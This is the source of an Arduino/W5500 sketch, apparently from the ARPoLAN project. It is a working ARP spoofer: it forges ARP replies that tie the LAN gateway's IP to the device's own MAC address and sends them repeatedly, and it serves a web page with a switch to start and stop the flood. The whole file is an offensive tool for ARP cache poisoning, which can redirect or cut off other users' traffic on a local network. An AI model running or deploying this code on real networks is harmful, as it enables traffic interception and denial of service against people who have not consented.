/* ____________________________
   This software is licensed under the MIT License:
   https://github.com/cifertech/ARPoLAN
   ________________________________________ */

#include <SPI.h>
#include <Ethernet.h>
#include <EthernetUdp.h>

// ===== Settings ===== //
#define debug /* Uncomment to get serial output */
#define led 9
int packetRate = 20; // Packets sent per second
static uint8_t mymac[] = { 0xc0, 0xab, 0x03, 0x22, 0x55, 0x99 };

int arp_count = 0;
unsigned long prevTime = 0;
bool connection = false;
bool toggle_status = false;

// ARP reply packet
uint8_t _data[42] = {
  /* Ethernet frame header */
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC: Broadcast
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC: Example MAC address
  0x08, 0x06,                         // EtherType: ARP

  /* ARP packet */
  0x00, 0x01,                         // Hardware type: Ethernet
  0x08, 0x00,                         // Protocol type: IPv4
  0x06,                               // Hardware size: MAC length
  0x04,                               // Protocol size: IP length
  0x00, 0x02,                         // Opcode: ARP Reply (0x02)
  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Sender MAC address
  0xc0, 0xa8, 0x02, 0x01,             // Sender IP address (192.168.2.1)
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Target MAC address (Broadcast)
  0xc0, 0xa8, 0x02, 0x64              // Target IP address (192.168.2.100)
};

EthernetUDP Udp;
EthernetServer server(80); // Create a server that listens on port 80

bool sendARP() {
  long curTime = millis();

  if (curTime - prevTime > 1000 / packetRate) {
    digitalWrite(led, HIGH);

    Udp.beginPacket(IPAddress(192, 168, 2, 100), 0); // Target IP address
    Udp.write(_data, sizeof(_data));
    Udp.endPacket();

    arp_count++;
    prevTime = curTime;

    digitalWrite(led, LOW);

#ifdef debug
    Serial.println("ARP PACKET SENT");
#endif

    return true;
  }

  return false;
}

void _connect() {
  Ethernet.begin(mymac);
  delay(1000);

  if (Ethernet.localIP() == INADDR_NONE) {
#ifdef debug
    Serial.println("DHCP failed");
#endif
    connection = false;
  } else {
#ifdef debug
    Serial.print("My IP: ");
    Serial.println(Ethernet.localIP());
    Serial.print("Netmask: ");
    Serial.println(Ethernet.subnetMask());
    Serial.print("Gateway IP: ");
    Serial.println(Ethernet.gatewayIP());
    Serial.print("DNS IP: ");
    Serial.println(Ethernet.dnsServerIP());
#endif

    // Set gateway IP
    IPAddress gatewayIP = Ethernet.gatewayIP();
    for (int i = 0; i < 4; i++) _data[28 + i] = gatewayIP[i];

    // Set fake MAC
    for (int i = 0; i < 6; i++) _data[6 + i] = _data[22 + i] = mymac[i];

    connection = true;
  }
}

void setup() {
  pinMode(led, OUTPUT);

#ifdef debug
  Serial.begin(115200);
  delay(2000);
  Serial.println("ready!");
  Serial.println("waiting for LAN connection...");
#endif

  Ethernet.init(17);  // W5500 chip select pin
  while (!connection) {
    _connect();
    delay(1000);
  }

  Udp.begin(8888); // Initializing UDP
  server.begin();  // Start the web server
}

void handleClient(EthernetClient client) {
  if (client) {
    bool currentLineIsBlank = true;
    String request = "";

    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        request += c;

        if (c == '\n' && currentLineIsBlank) {
          if (request.indexOf("GET /toggle?status=ON") >= 0) {
            toggle_status = true;
#ifdef debug
            Serial.println("Turn ON requested");
#endif
          } else if (request.indexOf("GET /toggle?status=OFF") >= 0) {
            toggle_status = false;
#ifdef debug
            Serial.println("Turn OFF requested");
#endif
          }

          // Send the response
          client.println("HTTP/1.1 200 OK");
          client.println("Content-Type: text/html");
          client.println("Connection: close");
          client.println();

          client.println("<!DOCTYPE HTML>");
          client.println("<html>");
          client.println("<head><title>ARP Spoofer</title>");
          client.println("<style>");
          client.println("body { background-color: #121212; color: white; font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }");
          client.println("h1 { margin-bottom: 20px; }");
          client.println(".button { display: inline-block; padding: 30px 50px; font-size: 30px; color: white; background-color: #333; border: 2px solid white; border-radius: 50%; text-decoration: none; margin-bottom: 20px; }");
          client.println(".button:hover { background-color: #444; }");
          client.println("p { font-size: 20px; }");
          client.println("</style>");
          client.println("</head>");
          client.println("<body>");
          client.println("<h1>ARP Spoofer</h1>");
          if (toggle_status) {
            client.println("<a href=\"/toggle?status=OFF\" class=\"button\">ON</a>");
          } else {
            client.println("<a href=\"/toggle?status=ON\" class=\"button\">OFF</a>");
          }
          client.println("<p>Packets sent: " + String(arp_count) + "</p>");
          client.println("</body>");
          client.println("</html>");

          break;
        }

        if (c == '\n') {
          currentLineIsBlank = true;
        } else if (c != '\r') {
          currentLineIsBlank = false;
        }
      }
    }

    delay(1);
    client.stop();
  }
}

void loop() {
  EthernetClient client = server.available();
  if (client) {
    handleClient(client);
  }

  if (connection && toggle_status) {
    sendARP();
  } else {
    digitalWrite(led, LOW); // No Connection, turn off STATUS LED
  }
}
